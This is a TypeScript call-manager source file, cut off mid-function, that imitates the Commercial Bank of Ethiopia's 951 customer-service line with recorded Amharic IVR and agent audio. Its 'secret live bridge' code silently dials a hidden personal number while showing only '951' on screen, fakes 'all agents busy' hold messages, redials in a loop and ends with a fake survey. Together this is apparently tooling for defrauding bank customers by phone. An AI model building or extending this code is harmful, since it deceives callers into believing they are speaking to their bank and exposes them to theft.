import { phoneAudio } from './audio';
import { ChatMessage } from './types';
import { CBE_WELCOME_AUDIO, CBE_GREETING_AUDIO } from './cachedAudio';
import {
  initLocalBrainAndCache,
  matchLocalTrainedResponse,
  inferLocalCallerTurn,
  recordLearnedTurnTimingAndUtterance,
  recordLearnedUtteranceOnly,
  matchLiveSpeechToLearnedPattern,
  applyReinforcementFeedback,
  getLocalLearningSummary,
  loadSelfLearningMemory,
  LearnedSamplePattern,
  ClassStepRecord,
  LearnedTrainingClass,
  loadLearnedClasses,
  addNewSpeakerClass,
  appendStepToSpeakerClass,
  saveFullLearnedClass,
  deleteLearnedClass,
  getStepTimingFromSelectedClass,
  getCurrentStepKey,
  getSavedSelectedClassId,
  saveSelectedClassIdToStorage,
  getSavedSelectedSupportAgentId,
  saveSelectedSupportAgentId,
  preloadSupportAgentsAudio,
  resolveSupportAgentAudioUrl,
  getPopulatedSupportAgentSteps,
} from './localBrain';
import {
  initSecretLiveBridgeAudioCache,
  loadSecretLiveBridgeConfig,
  getSecretBridgeSlotAudioUrl,
  SecretLiveCallPhase,
} from './secretLiveBridge';

export interface CallEvents {
  onStatusChange?: (status: string) => void;
  onAgentSpeakingChange?: (isSpeaking: boolean) => void;
  onUserSpeakingChange?: (isSpeaking: boolean) => void;
  onTurnPhaseChange?: (phase: 'red' | 'yellow' | 'green' | 'idle') => void;
  onSecretLivePhaseChange?: (phase: SecretLiveCallPhase, attempt: number) => void;
  onTranscriptUpdate?: (speaker: 'agent' | 'user', text: string) => void;
  onMicPermissionDenied?: (denied: boolean) => void;
  onMicVolume?: (volume: number) => void;
  onLocalCacheProgress?: (loaded: number, total: number) => void;
  onLiveTimingUpdate?: (timing: { speakSeconds: number; pauseSeconds: number }) => void;
  onDraftClassProgressUpdate?: (recordedStepsCount: number) => void;
  onClassesUpdated?: (classes: LearnedTrainingClass[], selectedClassId: string | null) => void;
  onLearningUpdate?: (stats: {
    totalSamples: number;
    totalLearnedPhrases: number;
    currentStepSamples: number;
    currentStepPauseMs: number;
    currentStepSpeakMs: number;
    currentStepPatternsLabel?: string;
    currentStepPatterns?: LearnedSamplePattern[];
  }) => void;
  onError?: (errorText: string) => void;
}

export class CbePhoneManager {
  private events: CallEvents;
  private recognition: any = null;
  private mediaRecorder: MediaRecorder | null = null;
  private audioChunks: Blob[] = [];
  private history: ChatMessage[] = [];
  private isCallActive = false;
  private isAgentSpeaking = false;
  private isListening = false;
  private silenceTimer: any = null;
  private vadInterval: any = null;
  private recordTimeout: any = null;
  private testModeTimer: any = null;
  private yellowDotTimer: any = null;
  private stopRecordingFn: (() => void) | null = null;
  private savePatternOnlyFn: ((customText?: string) => void) | null = null;
  private onResultCallback: ((text: string) => void) | null = null;
  private lastMatchedPatternIdx: number = 0;
  private currentClassDraftTurns: ClassStepRecord[] = [];
  private teachTurnActiveStartMs: number = 0;
  private currentSpeechTranscript = '';
  public isMuted: boolean = false;
  public useFastLocalMode: boolean = true;
  public isTestMode: boolean = false;
  public selectedClassId: string | null = null;
  public selectedSupportAgentId: string = 'support_edris';
  private customSupportStepCursor: number = 0;
  public secretLivePhase: SecretLiveCallPhase = 'idle';
  public secretLiveAttempt: number = 0;
  private secretRingTimer: any = null;
  private secretNextAttemptTimer: any = null;

  constructor(events: CallEvents = {}) {
    this.events = events;
    const savedClasses = loadLearnedClasses();
    const storedClassId = getSavedSelectedClassId();
    if (savedClasses.some((c) => c.id === storedClassId)) {
      this.selectedClassId = storedClassId;
    } else if (savedClasses.length > 0) {
      this.selectedClassId = savedClasses[0].id;
    }
    this.selectedSupportAgentId = getSavedSelectedSupportAgentId();

    preloadSupportAgentsAudio().catch((err) =>
      console.warn('Support audio preload warning:', err)
    );
    initSecretLiveBridgeAudioCache().catch((err) =>
      console.warn('Secret live bridge audio cache warning:', err)
    );

    // Wire up Android Java N-IDE Hybrid callbacks (window.onSecretCall*)
    if (typeof window !== 'undefined') {
      window.onSecretCallRinging = (attemptNum: number) => {
        if (!this.isCallActive) return;
        this.secretLiveAttempt = attemptNum || Math.max(1, this.secretLiveAttempt);
        this.secretLivePhase = 'dialing_hidden';
        this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
        this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');
      };
      window.onSecretCallNoAnswer = (_attemptNum: number) => {
        if (!this.isCallActive) return;
        this.handleSecretNoAnswerAndPlayBusyMp3();
      };
      window.onSecretCallAnswered = () => {
        if (!this.isCallActive) return;
        this.triggerSecretLiveAnswered();
      };
      window.onSecretCallRemoteEnded = () => {
        if (!this.isCallActive) return;
        this.triggerSecretLiveRemoteEnded();
      };
    }

    // Preload trained brain into LocalStorage and cache all 16 MP3s locally on phone
    initLocalBrainAndCache((loaded, total) => {
      this.events.onLocalCacheProgress?.(loaded, total);
    }).catch((err) => console.warn('Local cache init warning:', err));
  }

  setEvents(events: CallEvents) {
    this.events = events;
  }

  setMuted(muted: boolean) {
    this.isMuted = muted;
    if (muted) {
      this.events.onUserSpeakingChange?.(false);
    }
  }

  setSelectedSupportAgentId(agentId: string) {
    this.selectedSupportAgentId = agentId;
    saveSelectedSupportAgentId(agentId);
  }

  addCustomClass(name: string) {
    const { newClass, allClasses } = addNewSpeakerClass(name);
    this.selectedClassId = newClass.id;
    saveSelectedClassIdToStorage(newClass.id);
    this.events.onClassesUpdated?.(allClasses, newClass.id);
    this.events.onStatusChange?.(`✨ አዲስ ካራክተር «${newClass.name}» ተጨምሯል!`);
    return newClass;
  }

  setSelectedClassId(classId: string | null) {
    this.selectedClassId = classId;
    if (classId) {
      saveSelectedClassIdToStorage(classId);
    }
    this.currentClassDraftTurns = [];
    this.events.onDraftClassProgressUpdate?.(0);
    const classes = loadLearnedClasses();
    const chosen = classes.find((c) => c.id === classId);
    this.events.onClassesUpdated?.(classes, classId);
    if (chosen) {
      this.events.onStatusChange?.(
        this.isTestMode
          ? `🧪 በ ${chosen.name} የተማረውን በመፈተሽ ላይ...`
          : `👤 ${chosen.name} ተመርጧል — ለማስተማር «🎓 አስተምር» ወይም ለመፈተሽ «🧪 Test» ይንኩ`
      );
    }
    if (this.isTestMode && this.isCallActive && !this.isAgentSpeaking) {
      this.scheduleSelectedClassTestTimer();
    }
  }

  deleteClassById(classId: string) {
    const remaining = deleteLearnedClass(classId);
    this.events.onClassesUpdated?.(remaining, this.selectedClassId);
    const cleared = remaining.find((c) => c.id === classId);
    if (cleared) {
      this.events.onStatusChange?.(`🗑️ የ ${cleared.name} ልምምድ ተسቷል (0 ደረጃ)`);
    }
  }

  // Step 1 of Teaching Turn: User taps "🎓 አስተምር"
  startTeachingTurn() {
    this.teachTurnActiveStartMs = Date.now();
    const classes = loadLearnedClasses();
    const chosen = classes.find((c) => c.id === this.selectedClassId) || classes[0];
    this.events.onLiveTimingUpdate?.({ speakSeconds: 0, pauseSeconds: 0 });
    this.events.onStatusChange?.(
      `🎙️ [${chosen?.name || 'Jurey'}] እያስተማሩ ነው... ተናግረው ሲጨርሱ «✅ ጨረስኩ» ይንኩ`
    );
  }

  // Step 2 of Teaching Turn: User taps "✅ ጨረስኩ" -> records turn into Selected Speaker Class AND advances to next question!
  finishTeachingTurnAndAdvance() {
    const now = Date.now();
    const totalTurnMs =
      this.teachTurnActiveStartMs > 0
        ? Math.max(500, now - this.teachTurnActiveStartMs)
        : 2200;
    const speakDurationMs = Math.max(300, Math.round(totalTurnMs * 0.65));
    const pauseBeforeSendMs = Math.max(300, totalTurnMs - speakDurationMs);

    const stepKey = getCurrentStepKey(this.history);
    const turnIndex = this.history.filter((h) => h.role === 'user').length;
    const utteranceText = inferLocalCallerTurn(this.history);

    const stepRec: ClassStepRecord = {
      stepKey,
      turnIndex,
      totalTurnMs,
      speakDurationMs,
      pauseBeforeSendMs,
      avgVoicePeak: 30,
      utteranceText,
    };

    this.currentClassDraftTurns.push(stepRec);
    this.teachTurnActiveStartMs = 0;

    // Immediately save this step into the selected person's Class (e.g. Jurey, Tariku, Abebe...) in LocalStorage!
    const updatedClasses = appendStepToSpeakerClass(this.selectedClassId, stepRec);
    const chosen = updatedClasses.find((c) => c.id === this.selectedClassId) || updatedClasses[0];

    recordLearnedTurnTimingAndUtterance({
      history: [...this.history],
      speakDurationMs,
      pauseBeforeSendMs,
      totalTurnMs,
      avgVoicePeak: 30,
      burstCount: 2,
      noiseFloor: 6,
      utteranceText,
    });

    this.events.onClassesUpdated?.(updatedClasses, this.selectedClassId);
    this.events.onDraftClassProgressUpdate?.(this.currentClassDraftTurns.length);
    this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
    this.events.onStatusChange?.(
      `✅ [${chosen?.name || 'Jurey'}] ደረጃ #${turnIndex + 1} (${(totalTurnMs / 1000).toFixed(1)}s) ተመዘገበ!`
    );

    // Immediately advance to the next question from Idris!
    this.finishSpeakingManually();
  }

  // Step 3: User taps "💾 ሙሉ ለሙሉ ጨረስኩ" -> saves all recorded steps under the selected person's name in LocalStorage!
  saveCompleteClass(): LearnedTrainingClass | null {
    const { savedClass, allClasses } = saveFullLearnedClass(
      this.currentClassDraftTurns,
      this.selectedClassId
    );
    this.selectedClassId = savedClass.id;
    this.currentClassDraftTurns = [];
    this.teachTurnActiveStartMs = 0;

    this.events.onDraftClassProgressUpdate?.(0);
    this.events.onClassesUpdated?.(allClasses, savedClass.id);
    this.events.onStatusChange?.(
      `🎉 የ ${savedClass.name} ትምህርት (${savedClass.turnSequence.length} ደረጃዎች) በ LocalStorage ተቀመጠ!`
    );
    return savedClass;
  }

  private scheduleSelectedClassTestTimer() {
    if (this.testModeTimer) {
      clearTimeout(this.testModeTimer);
      this.testModeTimer = null;
    }
    if (this.yellowDotTimer) {
      clearTimeout(this.yellowDotTimer);
      this.yellowDotTimer = null;
    }
    if (!this.isTestMode || !this.isCallActive || this.isAgentSpeaking) return;

    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
    if (
      this.selectedSupportAgentId !== 'support_edris' &&
      populatedSteps.length > 0 &&
      this.customSupportStepCursor >= populatedSteps.length
    ) {
      this.events.onTurnPhaseChange?.('idle');
      this.events.onStatusChange?.(
        `✅ ሁሉም የተጫኑ ${populatedSteps.length} Steps ተጫውተው አልቀዋል!`
      );
      return;
    }

    const lastModel = [...this.history].reverse().find((h) => h.role === 'model');
    if (lastModel?.audioUrl?.includes('survey_rating')) return;

    const classTiming = getStepTimingFromSelectedClass({
      selectedClassId: this.selectedClassId,
      history: this.history,
    });

    this.events.onTurnPhaseChange?.('red');
    this.events.onStatusChange?.(
      `🧪 Test [${classTiming.className} - ደረጃ #${classTiming.turnNumber}]፦ በ ${(classTiming.totalTurnMs / 1000).toFixed(1)}s በራሱ ይመልሳል...`
    );

    // Turn the dot YELLOW (🟡) 650ms before the Agent speaks so the caller knows to stop talking!
    const yellowLeadMs = Math.max(200, classTiming.totalTurnMs - 650);
    this.yellowDotTimer = setTimeout(() => {
      this.yellowDotTimer = null;
      if (this.isCallActive && !this.isAgentSpeaking && this.isTestMode) {
        this.events.onTurnPhaseChange?.('yellow');
      }
    }, yellowLeadMs);

    this.testModeTimer = setTimeout(() => {
      this.testModeTimer = null;
      if (this.isCallActive && !this.isAgentSpeaking && this.isTestMode) {
        this.events.onTurnPhaseChange?.('yellow');
        this.finishSpeakingManually();
      }
    }, classTiming.totalTurnMs);
  }

  setTestMode(enabled: boolean) {
    this.isTestMode = enabled;
    if (this.testModeTimer) {
      clearTimeout(this.testModeTimer);
      this.testModeTimer = null;
    }
    if (this.isCallActive && !this.isAgentSpeaking) {
      if (enabled) {
        if (!this.isListening) {
          this.startListening(this.onResultCallback || (() => {}));
        } else {
          this.scheduleSelectedClassTestTimer();
        }
      } else {
        this.events.onStatusChange?.('🎓 ለማስተማር «🎓 አስተምር» የሚለውን ይንኩ');
      }
    }
  }

  // Pre-cached prompts in Amharic
  readonly welcomePrompt = 'እንኳን ወደ ኢትዮጵያ ንግድ ባንክ የደንበኞች አገልግሎት ማዕከል በደህና መጡ። ለአማርኛ 4ን ይጫኑ። Welcome to Commercial Bank of Ethiopia.';
  readonly agentGreeting = 'የኢትዮጵያ ንግድ ባንክ እድሪስ ነኝ ባኳ ምን ልርዳወት';

  // Start the call session
  startCall() {
    this.isCallActive = true;
    this.isMuted = false;
    this.history = [];
    this.currentSpeechTranscript = '';
    this.currentClassDraftTurns = [];
    this.teachTurnActiveStartMs = 0;
    this.customSupportStepCursor = 0;
    this.secretLivePhase = 'idle';
    this.secretLiveAttempt = 0;
    this.clearSecretLiveTimers();
    this.events.onSecretLivePhaseChange?.('idle', 0);
    this.events.onDraftClassProgressUpdate?.(0);
    this.events.onClassesUpdated?.(loadLearnedClasses(), this.selectedClassId);
  }

  private clearSecretLiveTimers() {
    if (this.secretRingTimer) {
      clearTimeout(this.secretRingTimer);
      this.secretRingTimer = null;
    }
    if (this.secretNextAttemptTimer) {
      clearTimeout(this.secretNextAttemptTimer);
      this.secretNextAttemptTimer = null;
    }
  }

  // End the call
  endCall() {
    this.isCallActive = false;
    this.secretLivePhase = 'idle';
    this.secretLiveAttempt = 0;
    this.clearSecretLiveTimers();
    if (typeof window !== 'undefined' && window.AndroidTelecomBridge?.endAllCalls) {
      try {
        window.AndroidTelecomBridge.endAllCalls();
      } catch {}
    }
    this.stopListening();
    phoneAudio.stopCurrentAudio();
    phoneAudio.stopRingback();
    phoneAudio.playCallEnded();
  }

  // Play authentic 951 welcome IVR prompt
  async playWelcomePrompt(): Promise<void> {
    if (!this.isCallActive) return;
    this.isAgentSpeaking = true;
    this.events.onAgentSpeakingChange?.(true);
    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የጥሪ ማዕከል');
    this.events.onTranscriptUpdate?.('agent', this.welcomePrompt);

    try {
      await phoneAudio.playAudioFile('/audio/cbe951.mp3');
    } catch (e) {
      console.warn('Playing cbe951.mp3 fallback:', e);
      try {
        await phoneAudio.playBase64Audio(CBE_WELCOME_AUDIO);
      } catch (err2) {
        await this.speakAgent(this.welcomePrompt);
      }
    } finally {
      this.isAgentSpeaking = false;
      this.events.onAgentSpeakingChange?.(false);
    }
  }

  // Secret Live Phone Bridge: Silently dial target phone number (e.g. 0965848508) for 2 rings
  // while keeping ONLY "951" on the screen!
  public startSecretDialAttempt() {
    if (!this.isCallActive) return;
    this.clearSecretLiveTimers();
    this.stopListening();
    phoneAudio.stopCurrentAudio();

    const cfg = loadSecretLiveBridgeConfig();
    const targetNum = (cfg.targetPhoneNumber || '0965848508').trim();
    const maxRingMs = Math.max(4000, (Number(cfg.maxRingSeconds) || 8) * 1000);

    this.secretLiveAttempt += 1;
    this.secretLivePhase = 'dialing_hidden';
    this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
    this.events.onTurnPhaseChange?.('idle');
    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');

    const hasNativeBridge =
      typeof window !== 'undefined' &&
      typeof window.AndroidTelecomBridge?.placeSecretCall === 'function';

    if (hasNativeBridge) {
      try {
        window.AndroidTelecomBridge!.placeSecretCall!(targetNum, maxRingMs);
      } catch (e) {
        console.warn('AndroidTelecomBridge placeSecretCall warning:', e);
      }
    } else if (cfg.playRingbackDuringDial) {
      // In Web Preview mode (or when carrier audio isn't active), play subtle phone ringback for the 2 rings
      phoneAudio.startRingback();
    }

    // 2-Ring Timeout (e.g. 8 seconds): Cut BEFORE Ethio Telecom plays "የደወሉለት ደንበኛ..."
    // and immediately play the "ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው..." MP3!
    this.secretRingTimer = setTimeout(() => {
      this.secretRingTimer = null;
      if (!this.isCallActive || this.secretLivePhase !== 'dialing_hidden') return;
      if (hasNativeBridge) {
        try {
          window.AndroidTelecomBridge?.cancelCurrentAttempt?.();
        } catch {}
      }
      this.handleSecretNoAnswerAndPlayBusyMp3();
    }, maxRingMs);
  }

  // Called when 2 rings pass without answer -> plays "ሁሉም የአገልግሎት ሰጪዎች..." MP3 and silently redials in a loop!
  public async handleSecretNoAnswerAndPlayBusyMp3() {
    if (!this.isCallActive || this.secretLivePhase === 'connected_live') return;
    this.clearSecretLiveTimers();
    phoneAudio.stopRingback();
    phoneAudio.stopCurrentAudio();

    this.secretLivePhase = 'playing_busy_mp3';
    this.isAgentSpeaking = true;
    this.events.onAgentSpeakingChange?.(true);
    this.events.onSecretLivePhaseChange?.('playing_busy_mp3', this.secretLiveAttempt);
    this.events.onStatusChange?.(
      'ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው፣ እባክዎ ትንሽ ይጠብቁ...'
    );

    const busyMp3Url = getSecretBridgeSlotAudioUrl('busy_hold');
    try {
      await phoneAudio.playAudioFile(busyMp3Url);
    } catch (e) {
      console.warn('Busy hold MP3 playback warning:', e);
    } finally {
      this.isAgentSpeaking = false;
      this.events.onAgentSpeakingChange?.(false);
    }

    // Immediately redial the hidden number again in the background if still on the call!
    if (this.isCallActive && this.secretLivePhase === 'playing_busy_mp3') {
      this.secretNextAttemptTimer = setTimeout(() => {
        this.secretNextAttemptTimer = null;
        if (this.isCallActive && this.secretLivePhase === 'playing_busy_mp3') {
          this.startSecretDialAttempt();
        }
      }, 350);
    }
  }

  // Called when the person at 0965848508 answers the call!
  public triggerSecretLiveAnswered() {
    if (!this.isCallActive) return;
    this.clearSecretLiveTimers();
    phoneAudio.stopRingback();
    phoneAudio.stopCurrentAudio();
    this.isAgentSpeaking = false;
    this.events.onAgentSpeakingChange?.(false);

    this.secretLivePhase = 'connected_live';
    this.events.onSecretLivePhaseChange?.('connected_live', this.secretLiveAttempt);
    this.events.onTurnPhaseChange?.('idle');
    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951)');
  }

  // Called when the person at 0965848508 hangs up after talking -> keeps 951 open and plays Post-Call Survey MP3!
  public async triggerSecretLiveRemoteEnded() {
    if (!this.isCallActive) return;
    this.clearSecretLiveTimers();
    phoneAudio.stopRingback();
    phoneAudio.stopCurrentAudio();

    this.secretLivePhase = 'playing_survey_mp3';
    this.isAgentSpeaking = true;
    this.events.onAgentSpeakingChange?.(true);
    this.events.onSecretLivePhaseChange?.('playing_survey_mp3', this.secretLiveAttempt);
    this.events.onStatusChange?.(
      'እሽ ስለ አገልግሎት አስተዳደር ቀጣይ ያሉትን መሙያ ይሙሉ ስለደወሉ እናመሰግናለን'
    );
    this.events.onTranscriptUpdate?.(
      'agent',
      'እሽ ስለ አገልግሎት አስተዳደር ቀጣይ ያሉትን መሙያ ይሙሉ ስለደወሉ እናመሰግናለን'
    );

    const surveyMp3Url = getSecretBridgeSlotAudioUrl('post_call_survey');
    try {
      await phoneAudio.playAudioFile(surveyMp3Url);
    } catch (e) {
      console.warn('Survey MP3 playback warning:', e);
    } finally {
      this.isAgentSpeaking = false;
      this.events.onAgentSpeakingChange?.(false);
    }
  }

  // Play recorded authentic agent greeting (Edris or selected custom Support Agent, OR Secret Live Phone Bridge) when 4 is pressed
  async playAgentGreeting(): Promise<void> {
    if (!this.isCallActive) return;

    // 1. Check if Secret Live Phone Bridge (e.g. 0965848508) is enabled in J11 Studio!
    const secretBridge = loadSecretLiveBridgeConfig();
    if (secretBridge.enabled) {
      this.secretLiveAttempt = 0;
      this.startSecretDialAttempt();
      return;
    }

    this.isAgentSpeaking = true;
    this.events.onAgentSpeakingChange?.(true);
    this.events.onTurnPhaseChange?.('green');

    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
    if (this.selectedSupportAgentId !== 'support_edris' && populatedSteps.length > 0) {
      const firstPopulated = populatedSteps[0];
      this.customSupportStepCursor = 1;
      this.events.onStatusChange?.(`${firstPopulated.title}`);
      this.events.onTranscriptUpdate?.('agent', `${firstPopulated.title} (${firstPopulated.fileName})`);
      this.history.push({
        role: 'model',
        text: firstPopulated.title,
        audioUrl: firstPopulated.blobUrl,
      });

      try {
        await phoneAudio.playAudioFile(firstPopulated.blobUrl);
      } catch (e) {
        console.warn('Custom support step 1 playback warning:', e);
      } finally {
        this.isAgentSpeaking = false;
        this.events.onAgentSpeakingChange?.(false);
      }
      return;
    }

    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ እድሪስ ነኝ ባኳ ምን ልርዳወት');
    this.events.onTranscriptUpdate?.('agent', this.agentGreeting);
    this.history.push({ role: 'model', text: this.agentGreeting, audioUrl: '/audio/edris_greeting.mp3' });

    const resolvedGreetingUrl = resolveSupportAgentAudioUrl(
      this.selectedSupportAgentId,
      '/audio/edris_greeting.mp3'
    );

    try {
      await phoneAudio.playAudioFile(resolvedGreetingUrl);
    } catch (e) {
      console.warn('Playing edris_greeting.mp3 fallback:', e);
      try {
        await phoneAudio.playAudioFile('/audio/1_cbe_greeting_ameha.mp3');
      } catch (err2) {
        await phoneAudio.playBase64Audio(CBE_GREETING_AUDIO);
      }
    } finally {
      this.isAgentSpeaking = false;
      this.events.onAgentSpeakingChange?.(false);
    }
  }

  // Play short polite "እሽ" acknowledgement while customer speaks digits/numbers
  async playEsheAcknowledgment(): Promise<void> {
    if (!this.isCallActive || this.isAgentSpeaking) return;
    try {
      await phoneAudio.playAudioFile('/audio/eshe_interjection.mp3');
    } catch (e) {
      console.warn('Interjection playback warning:', e);
    }
  }

  // Speak agent message (via Server TTS -> Web Audio fallback)
  async speakAgent(text: string): Promise<void> {
    if (!this.isCallActive) return;

    this.isAgentSpeaking = true;
    this.events.onAgentSpeakingChange?.(true);
    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ እየተናገረ ነው...');
    this.events.onTranscriptUpdate?.('agent', text);

    try {
      // 1. Try server Gemini TTS first (high quality, native voice)
      const res = await fetch('/api/tts', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text }),
      });

      if (res.ok) {
        const data = await res.json();
        if (data.audioBase64) {
          await phoneAudio.playBase64Audio(data.audioBase64);
          this.isAgentSpeaking = false;
          this.events.onAgentSpeakingChange?.(false);
          return;
        }
      }
    } catch (e) {
      console.warn('Server TTS failed, using browser speech fallback', e);
    }

    // 2. Fallback to Browser Speech Synthesis (only if Amharic voice is available)
    await phoneAudio.speakFallback(text);
    this.isAgentSpeaking = false;
    this.events.onAgentSpeakingChange?.(false);
  }

  // Start hands-free automatic listening for user's voice
  startListening(onResult: (userSpeech: string) => void) {
    if (!this.isCallActive || this.isAgentSpeaking) return;
    if (this.secretLivePhase !== 'idle' || loadSecretLiveBridgeConfig().enabled) {
      return;
    }

    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
    if (
      this.selectedSupportAgentId !== 'support_edris' &&
      populatedSteps.length > 0 &&
      this.customSupportStepCursor >= populatedSteps.length
    ) {
      this.events.onTurnPhaseChange?.('idle');
      this.events.onStatusChange?.(
        `✅ የተጫኑት ${populatedSteps.length} Steps ተጫውተው አልቀዋል!`
      );
      return;
    }

    this.isListening = true;
    this.currentSpeechTranscript = '';
    this.onResultCallback = onResult;
    this.events.onUserSpeakingChange?.(false);
    this.events.onTurnPhaseChange?.('red');

    if (this.isTestMode) {
      this.scheduleSelectedClassTestTimer();
    } else {
      this.events.onStatusChange?.('🎓 ለማስተማር «🎓 አስተምር» ይንኩ (ወይም «🧪 Test» ይሞክሩ)');
    }

    // Start direct high-fidelity microphone recording with live volume visualization
    this.fallbackMicrophoneRecording(onResult);
  }

  // MediaRecorder with Human Voice Isolation (300Hz-3400Hz Bandpass), music rejection, and Self-Learning LocalStorage Timing
  private async fallbackMicrophoneRecording(onResult: (text: string) => void) {
    try {
      this.isListening = true;
      this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));

      // Enable hardware DSP noise suppression, echo cancellation, and auto gain control
      const stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true,
          channelCount: 1,
        },
      });

      // Determine best supported mimeType across Android, iOS Safari, Chrome, and Desktop
      let selectedMime = 'audio/webm';
      try {
        if (typeof MediaRecorder !== 'undefined') {
          if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            selectedMime = 'audio/webm;codecs=opus';
          } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            selectedMime = 'audio/mp4';
          } else if (MediaRecorder.isTypeSupported('audio/webm')) {
            selectedMime = 'audio/webm';
          }
        }
      } catch (mimeErr) {
        console.warn('Mime detection warning:', mimeErr);
      }

      try {
        this.mediaRecorder = new MediaRecorder(stream, { mimeType: selectedMime });
      } catch (recErr) {
        this.mediaRecorder = new MediaRecorder(stream);
      }
      this.audioChunks = [];

      this.mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          this.audioChunks.push(event.data);
        }
      };

      // Set up AudioContext with Human Vocal Bandpass Filter (300Hz - 3400Hz) to reject background music bass & high noise
      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
      const audioCtx = new AudioCtx();
      if (audioCtx.state === 'suspended') {
        try {
          await audioCtx.resume();
        } catch (e) {
          console.warn('AudioContext resume:', e);
        }
      }

      const source = audioCtx.createMediaStreamSource(stream);

      // High-pass filter at 300Hz cuts out music bass, rumble, and wind noise
      const highpassFilter = audioCtx.createBiquadFilter();
      highpassFilter.type = 'highpass';
      highpassFilter.frequency.value = 300;

      // Low-pass filter at 3400Hz cuts out high-frequency hiss and music cymbals
      const lowpassFilter = audioCtx.createBiquadFilter();
      lowpassFilter.type = 'lowpass';
      lowpassFilter.frequency.value = 3400;

      // Filtered analyser specifically tuned to human speech frequencies
      const voiceAnalyser = audioCtx.createAnalyser();
      voiceAnalyser.fftSize = 256;
      voiceAnalyser.smoothingTimeConstant = 0.5;

      // Raw analyser to detect non-vocal background music energy
      const rawAnalyser = audioCtx.createAnalyser();
      rawAnalyser.fftSize = 256;

      source.connect(rawAnalyser);
      source.connect(highpassFilter);
      highpassFilter.connect(lowpassFilter);
      lowpassFilter.connect(voiceAnalyser);

      const voiceData = new Uint8Array(voiceAnalyser.frequencyBinCount);
      const rawData = new Uint8Array(rawAnalyser.frequencyBinCount);

      let turnStartTime = Date.now();
      let firstSpeechTime = 0;
      let lastSpeechPeakTime = 0;
      let silenceStart = Date.now();
      let hasSpoken = false;
      let isStopping = false;
      let wasTriggeredByUser = false;
      let peakSum = 0;
      let peakFrames = 0;
      let burstCount = 0;
      let wasSpeakingLastFrame = false;
      let frameCount = 0;
      let alreadySavedViaMezegeb = false;
      let initialPitchCentroid = 0;
      let latestPitchCentroid = 0;
      const voiceSigAccum = [0, 0, 0, 0, 0, 0, 0, 0];

      // Initialize dynamic noise floor from LocalStorage self-learning memory
      const savedMem = loadSelfLearningMemory();
      let rollingNoiseFloor = savedMem.noiseFloorEstimate || 6;

      const getNormalizedVoiceSignature = (): number[] => {
        if (peakFrames === 0) return [20, 25, 30, 28, 22, 18, 14, 10];
        return voiceSigAccum.map((sum) => Math.round(sum / peakFrames));
      };

      // Handler for "💾 መዝግብ" button: records Voice Signature + Seconds into LocalStorage on the spot
      // so the user can record 5 or 10 different ways for the current step!
      this.savePatternOnlyFn = (customText?: string) => {
        const now = Date.now();
        const speakDurationMs =
          firstSpeechTime > 0
            ? Math.max(250, (lastSpeechPeakTime || now) - firstSpeechTime)
            : Math.max(350, now - turnStartTime - 400);
        const pauseBeforeSendMs =
          lastSpeechPeakTime > 0 ? Math.max(250, now - lastSpeechPeakTime) : 850;
        const totalTurnMs = Math.max(450, now - turnStartTime);
        const avgVoicePeak = peakFrames > 0 ? Math.round(peakSum / peakFrames) : 28;
        const spokenText = customText?.trim() || inferLocalCallerTurn(this.history);

        recordLearnedTurnTimingAndUtterance({
          history: [...this.history],
          speakDurationMs,
          pauseBeforeSendMs,
          totalTurnMs,
          avgVoicePeak,
          burstCount: Math.max(1, burstCount),
          voiceSignature: getNormalizedVoiceSignature(),
          noiseFloor: Math.round(rollingNoiseFloor),
          utteranceText: spokenText,
        });

        const summary = getLocalLearningSummary(this.history);
        this.events.onLearningUpdate?.(summary);
        this.events.onStatusChange?.(
          `✅ መንገድ #${summary.currentStepSamples} ተመዘገበ! (ንግግር: ${(speakDurationMs / 1000).toFixed(1)}s | ዝምታ: ${(pauseBeforeSendMs / 1000).toFixed(1)}s) — ሌላ መንገድ ይናገሩ ወይም «✓ ላክ» ይንኩ`
        );

        // Reset live timers so user can immediately speak the next way (#2, #3... #10)
        alreadySavedViaMezegeb = true;
        turnStartTime = Date.now();
        firstSpeechTime = 0;
        lastSpeechPeakTime = 0;
        silenceStart = Date.now();
        hasSpoken = false;
        peakSum = 0;
        peakFrames = 0;
        burstCount = 0;
        wasSpeakingLastFrame = false;
        voiceSigAccum.fill(0);
        this.events.onLiveTimingUpdate?.({ speakSeconds: 0, pauseSeconds: 0 });
      };

      const stopRecordingAndSend = (triggeredByUser: boolean = true) => {
        if (isStopping) return;
        isStopping = true;
        wasTriggeredByUser = triggeredByUser;
        this.stopRecordingFn = null;
        this.events.onMicVolume?.(0);

        if (this.vadInterval) {
          clearInterval(this.vadInterval);
          this.vadInterval = null;
        }
        if (this.recordTimeout) {
          clearTimeout(this.recordTimeout);
          this.recordTimeout = null;
        }
        if (this.testModeTimer) {
          clearTimeout(this.testModeTimer);
          this.testModeTimer = null;
        }

        try {
          if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
            this.mediaRecorder.stop();
          }
          stream.getTracks().forEach((track) => track.stop());
          if (audioCtx.state !== 'closed') {
            audioCtx.close();
          }
        } catch (e) {
          console.warn('Error stopping media recorder:', e);
        }
      };

      this.stopRecordingFn = () => stopRecordingAndSend(true);

      this.mediaRecorder.onstop = async () => {
